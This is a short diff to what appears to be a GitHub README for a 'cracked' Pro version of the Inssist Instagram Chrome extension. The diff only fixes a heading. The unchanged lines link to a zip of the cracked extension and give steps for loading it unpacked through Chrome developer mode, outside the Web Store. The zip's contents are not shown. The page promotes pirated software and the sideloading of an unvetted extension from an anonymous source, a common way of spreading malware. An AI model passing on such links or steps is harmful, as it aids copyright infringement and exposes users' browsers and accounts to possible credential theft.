@@ -4,7 +4,7 @@ Inssist (Instagram Assistant) is a free Chrome extension that lets you upload In
 ## Download [Inssist Extension Cracked](https://github.com/SL911-x/Inssist-Extension-Cracked/raw/main/INSSIST%20Pro%20Cracked.zip)
 [Download](https://github.com/SL911-x/Inssist-Extension-Cracked/raw/main/INSSIST%20Pro%20Cracked.zip)
 
-#How To Install Insist Pro Crack?
+# How To Install Insist Pro Crack?
 1. Extract The Zip File
 2. Go to chrome://extensions/ and check the box for Developer mode in the top right.
 3. Go back to the chrome://extensions/ page and click the Load unpacked extension button and select the unzipped folders for your extension to install it.
